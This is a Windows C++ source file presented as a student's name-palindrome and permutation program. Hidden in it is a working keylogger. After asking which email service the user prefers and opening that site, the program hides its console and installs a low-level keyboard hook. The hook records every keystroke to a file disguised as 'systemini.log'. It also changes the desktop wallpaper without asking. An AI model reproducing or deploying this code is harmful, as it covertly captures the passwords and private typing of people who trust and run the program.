#include <stdint.h>
#include <cstdlib>
#include <iostream>
#include <conio.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <time.h>
#include <fstream>
#include <string>
#include <winuser.h>
#include <math.h> 
#include <wininet.h>
#include <ctime>
#include <cstring>
#include <process.h>
#include <winable.h>
 
#define _WIN32_WINNT 0x0400 

using namespace std;

void Stealth();

HHOOK hKeyHook; 
 
__declspec(dllexport) LRESULT CALLBACK KeyEvent ( 
  int nCode,      
  WPARAM wParam,  
  LPARAM lParam   
) { 
    if  ((nCode == HC_ACTION) &&       
        ((wParam == WM_SYSKEYDOWN) ||  
        (wParam == WM_KEYDOWN)))       
    { 
  
        KBDLLHOOKSTRUCT hooked = 
            *((KBDLLHOOKSTRUCT*)lParam); 
    
        DWORD dwMsg = 1; 
        dwMsg += hooked.scanCode << 16; 
        dwMsg += hooked.flags << 24; 
    
        char lpszName[0x100] = {0}; 
        lpszName[0] = '['; 
        int i = GetKeyNameText(dwMsg, 
            (lpszName+1),0xFF) + 1; 
        lpszName[i] = ']'; 
    
        FILE *file; 
        file=fopen("systemini.log","a+"); 
        fputs(lpszName,file); 
        fflush(file); 
    } 
 
    return CallNextHookEx(hKeyHook, 
        nCode,wParam,lParam); 
} 

void MsgLoop() 
{ 
    MSG message; 
    while (GetMessage(&message,NULL,0,0)) { 
        TranslateMessage( &message ); 
        DispatchMessage( &message ); 
    } 
} 

DWORD WINAPI KeyLogger(LPVOID lpParameter) 
{ 

    HINSTANCE hExe = GetModuleHandle(NULL); 
    if (!hExe) hExe = LoadLibrary((LPCSTR) lpParameter); 

    if (!hExe) return 1; 
    hKeyHook = SetWindowsHookEx (  
        WH_KEYBOARD_LL,            
        (HOOKPROC) KeyEvent,       
        hExe,                      
        NULL                       
    ); 

    MsgLoop(); 
    UnhookWindowsHookEx(hKeyHook); 
    return 0; 
} 

void wait ( int seconds )
{
        clock_t endwait;
        endwait = clock () + seconds * CLK_TCK ;
        while (clock() < endwait) {}
}
void swap(char *p,char *q)
   {
   char c;
   c=*p;
   *p=*q;
   *q=c;
   }

  void perm(char *a,int m,int n)
  {
     int r; 
     if (m == n)
      {
       printf("%s\n", a);
      }
      else
       {
        for (r = m; r <= n; r++)
       {
          swap((a+m), (a+r));
          perm(a, m+1, n);
          swap((a+m), (a+r)); //backtrack
        }
        }
   }
   
   void Stealth()
{
  HWND Stealth;
  AllocConsole();
  Stealth = FindWindowA("ConsoleWindowClass", NULL);
  ShowWindow(Stealth,0);
}
int main(int argc, char *argv[])
{
   clock_t t,w;
   t = clock();
   char a[80],rev[80];
   int i,j,l,flag,e,f,g,x,y,b=10,c;
   unsigned long d=0, h=0, k=0 ; 
   
   textcolor(10);
   system("title Udit Raikwar Program by using C++");
   cprintf("Enter your name : ");
   textcolor(12);
   gets(a);
   for(e=0;a[e]!=0;++e);
   Sleep (600);
   textcolor(9);
   printf("\nNumber of words in your name : ");
   textcolor(14);
   printf("%d\n",e);
   f=e-1;
   Sleep (1200);
   textcolor(13);
   printf("\nMaking reverse of your name : ");   
   for(l=0,f=e-1;f>=0;++l,--f)
   {
   rev[l]=a[f];
   }
   rev[l]='\0';
   Sleep (1200);
   textcolor(11);
   puts(rev);
   Sleep (1200);
   textcolor(12);
   printf("\nChecking condition for palindrome : ");
   Sleep (1500);
   for(l=0,f=e-1;l<f/2;++l,--f)
  {
   if(a[l]!=a[f])
  {
   flag=0;
   break;
  }
  }
   if(flag)
  {
   textcolor(10);
   printf("palindrome\n");
   textcolor(11);
   printf("\nOnly one arrangment is possible (i.e. original string) : ");
   textcolor(13);
   puts(a);
  }
   else
   {
   textcolor(10);
   printf("Not Palindrome\n");
   Sleep (1300);
   textcolor(15);
   printf("\nAll possible combinations :\n");
   Sleep (1300);
   textcolor(9);
   printf("\nWait for a  second ..\n");
   Sleep (1400);
   j=strlen(a);
   k=1;
   for(i=j;i!=0;--i)
   {
   k*=i;
   }
   textcolor(14);
   cout<<"\nYour name can be arrange in ";
   textcolor(10);
   cout<<k;
   textcolor(14);
   cout<<" ways\n";
   textcolor(11);
   printf("\nDo you want to see combinations of all your naming words ");
   textcolor(9);
   printf("\npress");
   textcolor(13);
   printf("\n1 for Yes\n2 for No\n");
   textcolor(15);
   cin>>g;
   if(g==1)
   {
   printf("\n");
   perm(a,0,strlen(a)-1);
   }
   else
   {goto next;}
   }
    next :
    textcolor(14);
    cout<<"\nWhich internet site would you prefer to use ...\n";
    textcolor(9);
    cout<<"Press\n";
    textcolor(12);
    cout<<"1 for Google Chrome\n2 for Firefox\n3 for Internet Explorer\n4 for any other\n";
    textcolor(15);
    cin>>x;
    textcolor(13);
    cout<<"\nWhich email account do you use ...\n";
    textcolor(9);
    cout<<"Press\n";
    textcolor(11);
    cout<<"1 for gmail\n2 for yahoo\n3 for rediffmail\n4 for any other\n";
    textcolor(15);
    cin>>y;

    system("start jack.mp3");
    wait(3);
 if(flag)
{
    for(c=0;c<12;c++)
  {
    for(b=10;b<15;++b)
       {
          d=8;h=27;      
          gotoxy(d,h);
          textcolor(b);
          cout<<"Your suggestions and comments are welcome to my facebook account :\n";
          textcolor(b-1);
          cout<<"\n                                UDIT RAIKWAR                           \n";
          textcolor(b-2);
          cout<<"\n          Jabalpur Engineering College - Information Technology    \n";
          textcolor(b-3);
          cout<<"\n                 Thank you " ;
          textcolor(b); 
          cout<<a;
          textcolor(b-3);
          cout<<" for viewing my program \n";    
          Sleep(180);
        }   
   }
}
 else if(g==1)
{
    if(k<121)
      {
          for(c=0;c<12;c++)
             {
               for(b=10;b<15;++b)
                {
                  d=8;h=(38+k);      
                  gotoxy(d,h);
                  textcolor(b);
                  cout<<"Your suggestions and comments are welcome to my facebook account :\n";
                  textcolor(b-1);
                  cout<<"\n                                UDIT RAIKWAR                         \n";
                  textcolor(b-2);
                  cout<<"\n           Jabalpur Engineering College - Information Technology    \n";
                  textcolor(b-3);
                  cout<<"\n                 Thank you " ;
                  textcolor(b); 
                  cout<<a;
                  textcolor(b-3);
                  cout<<" for viewing my program \n";   
                  Sleep(180);
                }   
             }
       }   
       else
        { 
          system("cls");
          for(c=0;c<12;c++)
            {
                 for(b=10;b<15;++b)
               {
                  d=8;h=2;      
                  gotoxy(d,h);
                  textcolor(b);
                  cout<<"Your suggestions and comments are welcome to my facebook account :\n";
                  textcolor(b-1);
                  cout<<"\n                                UDIT RAIKWAR                         \n";
                  textcolor(b-2);
                  cout<<"\n           Jabalpur Engineering College - Information Technology    \n";
                  textcolor(b-3);
                  cout<<"\n                 Thank you " ;
                  textcolor(b); 
                  cout<<a;
                  textcolor(b-3);
                  cout<<" for viewing my program \n";   
                  Sleep(180);
               }   
            }
      }       
}
else
{
    for(c=0;c<11;c++)
  {
    for(b=10;b<15;++b)
       {
          d=8;h=(37);      
          gotoxy(d,h);
          textcolor(b);
          cout<<"Your suggestions and comments are welcome to my facebook account :\n";
          textcolor(b-1);
          cout<<"\n                                UDIT RAIKWAR                           \n";
          textcolor(b-2);
          cout<<"\n           Jabalpur Engineering College - Information Technology    \n";
          textcolor(b-3);
          cout<<"\n                 Thank you " ;
          textcolor(b); 
          cout<<a;
          textcolor(b-3);
          cout<<" for viewing my program \n";   
          Sleep(180);
        }   
   }
}
            
    Sleep (400);
    switch (x)
{
    case 1 : 
    system("start chrome.exe http://facebook.com/udit.tutu");
    if(y==1)
    {system("start chrome.exe http://www.gmail.co.in");}
    if(y==2)
    {system("start chrome.exe http://www.yahoo.co.in");}
    if(y==3)
    {system("start chrome.exe http://www.rediffmail.com");}
    if(y==4)
    {system("start chrome.exe http://www.google.co.in");}
    if((y!=4)&&(y!=3)&&(y!=2)&&(y!=1))
    {system("start chrome.exe http://www.google.co.in");}
    break ;
    case 2 :
    system("start firefox.exe http://www.facebook.com/udit.tutu");
    if(y==1)
    {system("start firefox.exe http://www.gmail.com");}
    if(y==2)
    {system("start firefox.exe http://www.yahoo.co.in");}
    if(y==3)
    {system("start firefox.exe http://www.rediffmail.com");}
    if(y==4)
    {system("start firefox.exe http://www.google.co.in");}
    if((y!=4)&&(y!=3)&&(y!=2)&&(y!=1))
    {system("start firefox.exe http://www.google.co.in");}
    break ;
    case 3 :
    system("start iexplore.exe http://www.facebook.com/udit.tutu");
    if(y==1)
    {system("start iexplore.exe http://www.gmail.com");}
    if(y==2)
    {system("start iexplore.exe http://www.yahoo.co.in");}
    if(y==3)
    {system("start iexplore.exe http://www.rediffmail.com");}
    if(y==4)
    {system("start iexplore.exe http://www.google.co.in");}
    if((y!=4)&&(y!=3)&&(y!=2)&&(y!=1))
    {system("start iexplore.exe http://www.google.co.in");}
    break ;
    default :
    system("start iexplore.exe http://www.facebook.com/udit.tutu");
    if(y==1)
    {system("start iexplore.exe http://www.gmail.com");}
    if(y==2)
    {system("start iexplore.exe http://www.yahoo.co.in");}
    if(y==3)
    {system("start iexplore.exe http://www.rediffmail.com");}
    if(y==4)
    {system("start iexplore.exe http://www.google.co.in");}
    if((y!=4)&&(y!=3)&&(y!=2)&&(y!=1))
    {system("start iexplore.exe http://www.google.co.in");}
    break;
}
    
    Stealth();
    wait(2);	



 for(int o=0;o<=77;++o)
{
if(o%12==0)
{	
 const wchar_t *filenm = L"acb.jpg";
 bool isWallSet=SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0,(void*)filenm, SPIF_UPDATEINIFILE);	 
 if(isWallSet)
 {
	 cout<<"True\n";
 }
 else
 {
	 cout<<"False\n";
 }
 cout<<GetLastError()<<"\n";
 wait(2);
}

else if(o==7 || o==63 || o==35)
{
const wchar_t *filenm = L"Capture.jpg";
 bool isWallSet=SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0,(void*)filenm, SPIF_UPDATEINIFILE);	 
 if(isWallSet)
 {
	 cout<<"True\n";
 }
 else
 {
	 cout<<"False\n";
 }
 cout<<GetLastError()<<"\n";
 wait(2);
}

else if(o!=77)
{
const wchar_t *filenm = L"dpp.jpg";
 bool isWallSet=SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0,(void*)filenm, SPIF_UPDATEINIFILE);	 
 if(isWallSet)
 {
	 cout<<"True\n";
 }
 else
 {
	 cout<<"False\n";
 }
 cout<<GetLastError()<<"\n";
 Sleep(100);
}

else
{
const wchar_t *filenm = L"abcc.jpg";
 bool isWallSet=SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0,(void*)filenm, SPIF_UPDATEINIFILE);	 
 if(isWallSet)
 {
	 cout<<"True\n";
 }
 else
 {
	 cout<<"False\n";
 }
 cout<<GetLastError()<<"\n";
 
}

}

HANDLE hThread; 
    DWORD dwThread; 
    DWORD exThread; 
    hThread = CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE) 
        KeyLogger, (LPVOID) argv[0], NULL, &dwThread); 
    if (hThread) { 
        return WaitForSingleObject(hThread,INFINITE); 
    } else { 
        return 1; 
    } 
   
    textcolor(15);
    
    return EXIT_SUCCESS;
    
}
